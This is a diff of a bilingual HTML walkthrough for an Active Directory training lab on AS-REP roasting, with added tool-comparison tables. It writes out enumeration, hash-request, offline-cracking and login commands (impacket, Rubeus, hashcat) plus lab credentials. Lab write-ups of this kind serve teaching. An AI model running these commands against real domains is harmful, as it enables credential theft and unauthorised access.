@@ -33,26 +33,76 @@ hashcat -m 18200 captured_asrep.txt /usr/share/wordlists/rockyou.txt</pre>
     <p>Con pre-autenticación activada, el cliente debe cifrar una marca de tiempo con su clave (derivada de la contraseña) <em>antes</em> de que el KDC responda. Si la cuenta tiene el flag <code>DONT_REQ_PREAUTH</code>, el KDC entrega el AS-REP a cualquiera que lo pida: ese mensaje va cifrado con la clave del usuario, así que es un hash crackeable offline.</p>
 
     <h3>2 · Localizar cuentas sin pre-autenticación</h3>
-    <pre>export DC={{ ad_dc_ip }}
-export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
-
-# Filtro LDAP: bit 0x400000 de userAccountControl
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" \
+    <pre># Filtro LDAP: bit 0x400000 de userAccountControl
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" \
   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
   sAMAccountName</pre>
     <p>Aparece <code>svc.backup</code>. El atributo está correctamente configurado en el directorio — puedes comprobarlo tú mismo con esta consulta.</p>
 
     <h3>3 · Solicitar el AS-REP (comando real, contra Windows funciona así)</h3>
     <pre>impacket-GetNPUsers '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
-  -dc-ip $DC -request -format hashcat -outputfile asrep.hash
+  -dc-ip {{ ad_dc_ip }} -request -format hashcat -outputfile asrep.hash
 
 cat asrep.hash
 # $krb5asrep$23$svc.backup@{{ ad_realm }}:a1b2c3...$e4f5...</pre>
-    <p><strong>Nota sobre este laboratorio:</strong> el KDC de Samba AD DC no siempre entrega el AS-REP sin preautenticación en la práctica, aunque el atributo <code>DONT_REQ_PREAUTH</code> esté correctamente activado (limitación conocida de la implementación del KDC de Samba frente a un Domain Controller Windows real). Si el comando anterior no produce un hash, descarga el ya "capturado":</p>
-    <pre>smbclient -N //$DC/public -c 'get captured_asrep.txt'
+    <p><strong>Nota sobre este laboratorio:</strong> el KDC de Samba AD DC no siempre entrega el AS-REP sin preautenticación en la práctica, aunque el atributo <code>DONT_REQ_PREAUTH</code> esté correctamente activado (limitación conocida de la implementación del KDC de Samba frente a un Domain Controller Windows real — verificado también leyendo el AS-REQ/AS-REP crudo, el KDC responde exigiendo preauth igualmente). Si el comando anterior no produce un hash, descarga el ya "capturado":</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_asrep.txt'
 cat captured_asrep.txt
 # $krb5asrep$23$svc.backup@{{ ad_realm }}:...</pre>
+
+    <h3>Referencia: PowerView / Rubeus / impacket</h3>
+    <p>Tabla comparativa de los comandos equivalentes contra un Domain Controller Windows real (PowerView y Rubeus son herramientas .NET/PowerShell, no aplican directamente contra Samba):</p>
+    <div class="overflow-x-auto">
+      <table class="w-full text-xs">
+        <thead>
+          <tr class="text-left text-gray-400 border-b border-gray-200 dark:border-gray-700">
+            <th class="py-1.5 pr-3 font-medium">Acción</th>
+            <th class="py-1.5 pr-3 font-medium">PowerView</th>
+            <th class="py-1.5 pr-3 font-medium">Rubeus</th>
+            <th class="py-1.5 font-medium">impacket</th>
+          </tr>
+        </thead>
+        <tbody class="text-gray-600 dark:text-gray-400">
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Enumerar</td>
+            <td class="py-1.5 pr-3 font-mono">Get-DomainUser -PreauthNotRequired</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py dominio.local/ -dc-ip &lt;IP&gt; -usersfile usuarios.txt</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Obtener hash</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 pr-3 font-mono">Rubeus.exe asreproast /nowrap</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py dominio.local/ -dc-ip &lt;IP&gt; -request -format hashcat</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Usuario específico</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 pr-3 font-mono">Rubeus.exe asreproast /user:nombre /nowrap</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py dominio.local/usuario -dc-ip &lt;IP&gt; -request -no-pass</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Con lista de usuarios</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 pr-3 font-mono">Rubeus.exe asreproast /nowrap</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py dominio.local/ -dc-ip &lt;IP&gt; -usersfile usuarios.txt -request</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Crackear (hashcat)</td>
+            <td class="py-1.5 pr-3">—</td>
+            <td class="py-1.5 pr-3 font-mono">hashcat -m 18200 hash.txt diccionario.txt</td>
+            <td class="py-1.5 font-mono">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</td>
+          </tr>
+          <tr>
+            <td class="py-1.5 pr-3">Modo hashcat</td>
+            <td class="py-1.5 pr-3">—</td>
+            <td class="py-1.5 pr-3 font-mono">18200</td>
+            <td class="py-1.5 font-mono">18200</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
 
     <h3>4 · Crackear el hash offline</h3>
     <pre># hashcat (modo 18200 = Kerberos 5 AS-REP etype 23)
@@ -63,9 +113,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt</pre>
     <p>La contraseña recuperada es <code>Welcome1</code>.</p>
 
     <h3>5 · Validar y capturar la flag</h3>
-    <pre>nxc smb $DC -u 'svc.backup' -p 'Welcome1' --shares
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.backup' -p 'Welcome1' --shares
 
-smbclient //$DC/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigación</h3>
@@ -84,26 +134,76 @@ smbclient //$DC/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-
     <p>With pre-authentication enabled the client must encrypt a timestamp with its key (derived from the password) <em>before</em> the KDC answers. If the account carries the <code>DONT_REQ_PREAUTH</code> flag, the KDC hands the AS-REP to anyone who asks: that message is encrypted with the user key, so it is an offline-crackable hash.</p>
 
     <h3>2 · Find accounts without pre-authentication</h3>
-    <pre>export DC={{ ad_dc_ip }}
-export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
-
-# LDAP filter: bit 0x400000 of userAccountControl
-ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
-  -b "$BASEDN" \
+    <pre># LDAP filter: bit 0x400000 of userAccountControl
+ldapsearch -x -H ldap://{{ ad_dc_ip }} -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
+  -b "DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}" \
   '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
   sAMAccountName</pre>
     <p><code>svc.backup</code> shows up. The attribute is genuinely set on the directory — you can confirm it yourself with this query.</p>
 
     <h3>3 · Request the AS-REP (real command, works exactly like this against Windows)</h3>
     <pre>impacket-GetNPUsers '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
-  -dc-ip $DC -request -format hashcat -outputfile asrep.hash
+  -dc-ip {{ ad_dc_ip }} -request -format hashcat -outputfile asrep.hash
 
 cat asrep.hash
 # $krb5asrep$23$svc.backup@{{ ad_realm }}:a1b2c3...$e4f5...</pre>
-    <p><strong>Note about this lab:</strong> Samba AD DC's KDC does not always deliver the preauth-free AS-REP in practice, even though the <code>DONT_REQ_PREAUTH</code> attribute is correctly set (a known limitation of Samba's KDC implementation versus a real Windows Domain Controller). If the command above doesn't produce a hash, download the already-"captured" one:</p>
-    <pre>smbclient -N //$DC/public -c 'get captured_asrep.txt'
+    <p><strong>Note about this lab:</strong> Samba AD DC's KDC does not always deliver the preauth-free AS-REP in practice, even though the <code>DONT_REQ_PREAUTH</code> attribute is correctly set (a known limitation of Samba's KDC implementation versus a real Windows Domain Controller — also confirmed by reading the raw AS-REQ/AS-REP exchange, the KDC responds demanding preauth regardless). If the command above doesn't produce a hash, download the already-"captured" one:</p>
+    <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_asrep.txt'
 cat captured_asrep.txt
 # $krb5asrep$23$svc.backup@{{ ad_realm }}:...</pre>
+
+    <h3>Reference: PowerView / Rubeus / impacket</h3>
+    <p>Comparison table of the equivalent commands against a real Windows Domain Controller (PowerView and Rubeus are .NET/PowerShell tools, they don't apply directly against Samba):</p>
+    <div class="overflow-x-auto">
+      <table class="w-full text-xs">
+        <thead>
+          <tr class="text-left text-gray-400 border-b border-gray-200 dark:border-gray-700">
+            <th class="py-1.5 pr-3 font-medium">Action</th>
+            <th class="py-1.5 pr-3 font-medium">PowerView</th>
+            <th class="py-1.5 pr-3 font-medium">Rubeus</th>
+            <th class="py-1.5 font-medium">impacket</th>
+          </tr>
+        </thead>
+        <tbody class="text-gray-600 dark:text-gray-400">
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Enumerate</td>
+            <td class="py-1.5 pr-3 font-mono">Get-DomainUser -PreauthNotRequired</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py domain.local/ -dc-ip &lt;IP&gt; -usersfile users.txt</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Get hash</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 pr-3 font-mono">Rubeus.exe asreproast /nowrap</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py domain.local/ -dc-ip &lt;IP&gt; -request -format hashcat</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Specific user</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 pr-3 font-mono">Rubeus.exe asreproast /user:name /nowrap</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py domain.local/user -dc-ip &lt;IP&gt; -request -no-pass</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">With a user list</td>
+            <td class="py-1.5 pr-3">N/A</td>
+            <td class="py-1.5 pr-3 font-mono">Rubeus.exe asreproast /nowrap</td>
+            <td class="py-1.5 font-mono">GetNPUsers.py domain.local/ -dc-ip &lt;IP&gt; -usersfile users.txt -request</td>
+          </tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800">
+            <td class="py-1.5 pr-3">Crack (hashcat)</td>
+            <td class="py-1.5 pr-3">—</td>
+            <td class="py-1.5 pr-3 font-mono">hashcat -m 18200 hash.txt wordlist.txt</td>
+            <td class="py-1.5 font-mono">hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt</td>
+          </tr>
+          <tr>
+            <td class="py-1.5 pr-3">hashcat mode</td>
+            <td class="py-1.5 pr-3">—</td>
+            <td class="py-1.5 pr-3 font-mono">18200</td>
+            <td class="py-1.5 font-mono">18200</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
 
     <h3>4 · Crack the hash offline</h3>
     <pre># hashcat (mode 18200 = Kerberos 5 AS-REP etype 23)
@@ -114,9 +214,9 @@ john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt</pre>
     <p>The recovered password is <code>Welcome1</code>.</p>
 
     <h3>5 · Validate and capture the flag</h3>
-    <pre>nxc smb $DC -u 'svc.backup' -p 'Welcome1' --shares
+    <pre>nxc smb {{ ad_dc_ip }} -u 'svc.backup' -p 'Welcome1' --shares
 
-smbclient //$DC/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
+smbclient //{{ ad_dc_ip }}/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'</pre>
     <pre>HL{···}</pre>
 
     <h3>Mitigation</h3>
